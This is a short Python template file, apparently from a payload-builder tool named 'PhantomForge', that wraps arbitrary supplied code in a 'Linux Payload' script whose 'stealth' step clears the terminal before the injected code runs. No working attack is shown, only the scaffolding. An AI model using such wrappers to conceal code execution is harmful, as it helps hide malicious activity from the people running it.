# templates/linux_template.py

def generate(core_code):
    return f"""
# Linux Payload - PhantomForge | NulLNet
import os

def stealth():
    try:
        os.system("clear")
    except:
        pass

stealth()

{core_code}
"""
